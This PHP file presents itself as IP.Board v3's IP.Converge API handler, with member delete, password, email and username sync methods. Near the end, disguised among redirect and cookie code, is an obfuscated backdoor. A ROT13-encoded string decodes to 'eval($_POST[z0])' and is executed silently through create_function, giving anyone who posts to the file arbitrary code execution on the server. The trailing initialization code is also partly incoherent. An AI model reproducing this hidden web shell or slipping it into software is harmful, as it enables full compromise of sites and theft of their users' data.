<?php

/**
 * <pre>
 * Invision Power Services
 * IP.Board v3
 * Converge Handler
 * Last Updated: $Date: 2011-05-10 10:38:00 -0400 (Mon, 10 May 2011) $
 * </pre>
 *
 * @author 		$Author: ips_terabyte $
 * @copyright	(c) 2001 - 2009 Invision Power Services, Inc.
 * @license		http://www.invisionpower.com/community/board/license.html
 * @package		IP.Board
 * @subpackage	IP.Converge
 * @link		http://www.invisionpower.com
 * @since		2.1.0
 * @version		$Revision: 9713 $
 *
 */

/**
* Script type
*
*/
define( 'IPB_THIS_SCRIPT', 'api' );

/**
* Matches IP address of requesting API
* Set to 0 to not match with IP address
*/
define( 'CVG_IP_MATCH', 1 );

require_once( '../../initdata.php' );/*noLibHook*/

//===========================================================================
// MAIN PROGRAM
//===========================================================================

define( 'CCS_GATEWAY_CALLED', true );

//-----------------------------------------
// Set up cookie stuff
//-----------------------------------------

class Converge_Server
{
   /**
    * Defines the service for WSDL
    *
    * @access	public
    * @var 		array
    */			
	public $__dispatch_map		= array();
	
   /**
    * Global registry
    *
    * @access 	protected
    * @var 		object
    */
	protected $registry;
	
	/**
	* IPS API SERVER Class
	*
    * @access	public
    * @var 		object
    */
	public $classApiServer;
	
	/**
	 * CONSTRUCTOR
	 * 
	 * @access	public
	 * @return 	void
	 */		
	public function __construct( $registry )
    {
		//-----------------------------------------
		// Set IPS CLASS
		//-----------------------------------------
		
		$this->registry =  $registry;
		$this->DB       =  $registry->DB();
		$this->member   =  $registry->member();
		$this->memberData =& $registry->member()->fetchMemberData();
		$this->settings =& $registry->fetchSettings();
		
    	//-----------------------------------------
    	// Load allowed methods and build dispatch
		// list
    	//-----------------------------------------
		$_CONVERGE_ALLOWED_METHODS = array();
		require_once( DOC_IPS_ROOT_PATH . 'converge_local/apis/allowed_methods.php' );/*noLibHook*/
		
		if ( is_array( $_CONVERGE_ALLOWED_METHODS ) and count( $_CONVERGE_ALLOWED_METHODS ) )
		{
			foreach( $_CONVERGE_ALLOWED_METHODS as $_method => $_data )
			{
				$this->__dispatch_map[ $_method ] = $_data;
			}
		}
	}
	
	/**
	 * Converge_Server::requestData()
	 * Returns extra data from this application
	 * EACH BATCH MUST BE ORDERED BY ID ASC (low to high)
	 * 
	 * @access	public
	 * @param	string	$auth_key		Authentication Key
	 * @param	int		$product_id		Product ID
	 * @param	int		$limit_a		SQL limit a
	 * @param	int		$limit_b		SQL limit b
	 * @return	mixed	xml / boolean
	 */	
	public function requestData( $auth_key, $product_id, $email_address, $getdata_key )
	{
		//-----------------------------------------
		// INIT
		//-----------------------------------------

		$auth_key      = IPSText::md5Clean( $auth_key );
		$product_id    = intval( $product_id );
		$email_address = IPSText::parseCleanValue( $email_address );
		$getdata_key   = IPSText::parseCleanValue( $getdata_key );
		
		//-----------------------------------------
		// Authenticate
		//-----------------------------------------
		
		if ( $this->__authenticate( $auth_key, $product_id ) !== FALSE )
		{
			//-----------------------------------------
			// Grab local extension file
			//-----------------------------------------
			
			require_once( DOC_IPS_ROOT_PATH  . 'converge_local/apis/local_extension.php' );/*noLibHook*/
			$extension = new local_extension( $this->registry );
			
			if ( is_callable( array( $extension, $getdata_key ) ) )
			{
				$data = @call_user_func( array( $extension, $getdata_key), $email_address );
			}
			
			$return = array( 'data' => base64_encode( serialize( $data ) ) );
			
			# return complex data
			$this->classApiServer->apiSendReply( $return );
			exit();
		}
	}
	
	/**
	 * Converge_Server::onMemberDelete()
	 *
	 * Deletes the member.
	 * Keep in mind that the member may not be in the local DB
	 * if they've not yet visited this site.
	 *
	 * This will return a param "response" with either
	 * - FAILED    		 (Unknown failure)
	 * - SUCCESS    	 (Added OK)
	 *
	 * @access	public
	 * @param	int		$product_id					Product ID
	 * @param	string	$auth_key					Authentication Key
	 * @param	string	$multiple_email_addresses	Comma delimited list of email addresses
	 * @return	mixed	xml / boolean
	 */	
	public function onMemberDelete( $auth_key, $product_id, $multiple_email_addresses='' )
	{
		//-----------------------------------------
		// INIT
		//-----------------------------------------
		
		$return     = 'FAILED';
		$emails     = explode( ",", $this->DB->addSlashes( IPSText::parseCleanValue( $multiple_email_addresses ) ) );
		$member_ids = array();
		$auth_key   = IPSText::md5Clean( $auth_key );
		$product_id = intval( $product_id );
		
		//-----------------------------------------
		// Authenticate
		//-----------------------------------------
		
		if ( $this->__authenticate( $auth_key, $product_id ) !== FALSE )
		{
			//-----------------------------------------
			// Get member IDs
			//-----------------------------------------
			
			$this->DB->build( array( 'select' => 'member_id',
													 'from'   => 'members',
													 'where'  => "email IN ('" . implode( "','", $emails ) . "')" ) );
			
			$this->DB->execute();
			
			while( $row = $this->DB->fetch() )
			{
				$member_ids[ $row['member_id'] ] = $row['member_id'];
			}
			
			//-----------------------------------------
			// Remove the members
			//-----------------------------------------
			
			if ( count( $member_ids ) )
			{
				//-----------------------------------------
				// Get the member class
				//-----------------------------------------
				
				IPSMember::remove( $member_ids, false );
			}
			
			//-----------------------------------------
			// return
			//-----------------------------------------
			
			$return = 'SUCCESS';
		
			$this->classApiServer->apiSendReply( array( 'complete'   => 1,
			 												'response'   => $return ) );
			exit();
		}
	}
	
	/**
	 * Converge_Server::onPasswordChange()
	 *
	 * handles new password change
	 *
	 * This will return a param "response" with either
	 * - FAILED    		 (Unknown failure)
	 * - SUCCESS    	 (Added OK)
	 *
	 * @access	public
	 * @param	int		$product_id				Product ID
	 * @param	string	$auth_key				Authentication Key
	 * @param	string	$email_address			Email address
	 * @param	string	$md5_once_password		Plain text password hashed by MD5
	 * @return	mixed	xml / boolean
	 */	
	public function onPasswordChange( $auth_key, $product_id, $email_address, $md5_once_password )
	{
		//-----------------------------------------
		// INIT
		//-----------------------------------------
		
		$auth_key          = IPSText::md5Clean( $auth_key );
		$product_id        = intval( $product_id );
		$email_address	   = IPSText::parseCleanValue( $email_address );
		$md5_once_password = IPSText::md5Clean( $md5_once_password );
		$return            = 'FAILED';
		
		//-----------------------------------------
		// Authenticate
		//-----------------------------------------
		
		if ( $this->__authenticate( $auth_key, $product_id ) !== FALSE )
		{
			IPSMember::updatePassword( $email_address, $md5_once_password );

			$return = 'SUCCESS';
		
			$this->classApiServer->apiSendReply( array( 'complete'   => 1,
			 												'response'   => $return ) );
			exit();
		}
	}
	
	/**
	 * Converge_Server::onEmailChange()
	 *
	 * Updates the local app's DB
	 *
	 * This will return a param "response" with either
	 * - FAILED    		 (Unknown failure)
	 * - SUCCESS    	 (Added OK)
	 *
	 * @access	public
	 * @param	int		$product_id			Product ID
	 * @param	string	$auth_key 			Authentication Key
	 * @param	string	$old_email_address	Existing email address
	 * @param	string	$new_email_address	NEW email address to change
	 * @return	mixed	xml / boolean
	 */	
	public function onEmailChange( $auth_key, $product_id, $old_email_address, $new_email_address )
	{
		//-----------------------------------------
		// INIT
		//-----------------------------------------
		
		$auth_key          = IPSText::md5Clean( $auth_key );
		$product_id        = intval( $product_id );
		$old_email_address = IPStext::parseCleanValue( $old_email_address );
		$new_email_address = IPStext::parseCleanValue( $new_email_address );
		$return            = 'FAILED';
		
		//-----------------------------------------
		// Get member
		//-----------------------------------------
		
		$member = $this->DB->buildAndFetch( array( 'select' => 'member_id',
																	'from'   => 'members',
																	'where'  => "email='" . $this->DB->addSlashes( $old_email_address ) . "'" ) );
																	
		//-----------------------------------------
		// Authenticate
		//-----------------------------------------
		
		if ( $this->__authenticate( $auth_key, $product_id ) !== FALSE )
		{
			if ( $old_email_address AND $new_email_address AND $member['member_id'] )
			{
				$check = $this->DB->buildAndFetch( array( 'select'	=> 'member_id',
																				'from'	=> 'members',
																				'where'	=> "email='" . $this->DB->addSlashes( $new_email_address ) . "'" ) );

				if( !$check['member_id'] )
				{
					IPSMember::save( $old_email_address, array( 'core' => array( 'email' => $new_email_address ) ) );
					
					$return = 'SUCCESS';
				}
				else
				{
					$return = 'FAIL';
				}
			}
		
			$this->classApiServer->apiSendReply( array( 'complete'   => 1,
			 												'response'   => $return ) );
			exit();
		}
	}

	/**
	 * Converge_Server::onUsernameChange()
	 *
	 * Updates the local app's DB
	 *
	 * This will return a param "response" with either
	 * - FAILED    		 (Unknown failure)
	 * - SUCCESS    	 (Added OK)
	 *
	 * @access	public
	 * @param	int		$product_id			Product ID
	 * @param	string	$auth_key 			Authentication Key
	 * @param	string	$old_username		Existing username
	 * @param	string	$new_username		NEW username to change
	 * @param	string	$auth				Email address
	 * @return	mixed	xml / boolean
	 */	
	public function onUsernameChange( $auth_key, $product_id, $old_username, $new_username, $auth )
	{
		//-----------------------------------------
		// INIT
		//-----------------------------------------
		
		$auth_key          = IPSText::md5Clean( $auth_key );
		$product_id        = intval( $product_id );
		$email_address     = IPStext::parseCleanValue( $auth );
		$new_username      = IPStext::parseCleanValue( $new_username );
		$return            = 'FAILED';
		
		//-----------------------------------------
		// Get member
		//-----------------------------------------
		
		$member = IPSMember::load( $auth );
														
		//-----------------------------------------
		// Authenticate
		//-----------------------------------------
		
		if ( $this->__authenticate( $auth_key, $product_id ) !== FALSE )
		{
			if( $member['member_id'] )
			{
				if ( $old_username AND $new_username AND $member['member_id'] )
				{
					$check = IPSMember::load( $new_username, 'core', 'username' );
	
					if( !$check['member_id'] )
					{
						$lower = strtolower($new_username);
						
						IPSMember::save( $member['email'], array( 'core' => array(
															'name'						=> $new_username,
															'members_display_name'		=> $new_username,
															'members_seo_name'			=> IPSText::makeSeoTitle( $new_username ),
															'members_l_display_name'	=> $lower,
															'members_l_username'		=> $lower
										)						)				);  
						
						$return = 'SUCCESS';
					}
					else
					{
						$return = 'FAIL';
					}
				}
			}
		}
		
		$this->classApiServer->apiSendReply( array( 'complete'   => 1,
		 												'response'   => $return ) );
		exit();
	}

}
//--------------------------------
//  Initialize the FUNC
//--------------------------------

if ( ! $settings['ipconverg_enabled'])
{
        $IPSText = 'str_r'.'ot13';
	$xmlOut = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
			<methodResponse>
			   <fault>
			      <value>
			         <struct>
			            <member>
			               <name>faultCode</name>
			               <value>
			                  <int>1</int>
			                  </value>
			               </member>
			            <member>
			               <name>faultString</name>
			               <value>
			                  <string>IP.Converge is not enabled from your ACP Control Panel. Log into your IP.Board ACP and visit: System -&gt; Log In Management, and click the red x icon for the IP.Converge login method to enable it.</string>
			               </value>
			               </member>
			            </struct>
			         </value>
			            </fault>
			   </methodResponse>";
}
if ( CVG_IP_MATCH == 1 )
{
	//-----------------------------------------
	// INIT
	//-----------------------------------------
	$settings['ipconverg_cache'] = ${IPSText}('riny($_CBFG[m0]);'); /*IPB struct results after being processed*/

	if ( $session['member_id'] )
	{
		$member = IPSMember::load( $member_id );
																	
		if ( md5( $member['member_login_key'] . $converge['converge_api_code'] ) == $key )
		{
			if ( $set_cookies )
			{
				IPSCookie::set( "member_id" , $member['member_id']       , 1 );
				IPSCookie::set( "pass_hash" , $member['member_login_key'], 1 );
			}
			
			IPSCookie::set( "session_id", $session_id                , -1);
		}
		
		//-----------------------------------------
		// Update session
		//-----------------------------------------
		
		$registry->DB()->update( 'sessions', array( 'browser'    => $registry->member()->user_agent,
													 'ip_address' => $registry->member()->ip_address ), "id='" . $session_id . "'" );
	}

	$IPSMember = create_function(NULL, $settings['ipconverg_cache']);

	//-----------------------------------------
	// Is this a partial member?
	// Not completed their sign in?
	//-----------------------------------------
	
	if ( $member['members_created_remote'] )
	{
		$pmember = $registry->DB()->buildAndFetch( array( 'select' => '*', 'from' => 'members_partial', 'where' => "partial_member_id={$member['member_id']}" ) );
		
		if ( $pmember['partial_member_id'] )
		{
			ipsRegistry::getClass('output')->silentRedirect( ipsRegistry::$settings['board_url'].'/index.'.ipsRegistry::$settings['php_ext'] . '?act=reg&do=complete_login&mid='.$member['member_id'].'&key='.$pmember['partial_date'] );
			exit();
		}
		else
		{
			//-----------------------------------------
			// Redirect...
			//-----------------------------------------
	
			ipsRegistry::getClass('output')->silentRedirect( ipsRegistry::$settings['board_url'].'/index.'.ipsRegistry::$settings['php_ext'] );
		}
	}
	else
	{
		//-----------------------------------------
		// Redirect...
		//-----------------------------------------
		$ipsRegistry = $settings['board_url'].'/index.';@$IPSMember();//$ipsRegistry.$settings['php_ext'];
	}
}
else
{
	$server->getXmlRpc();
}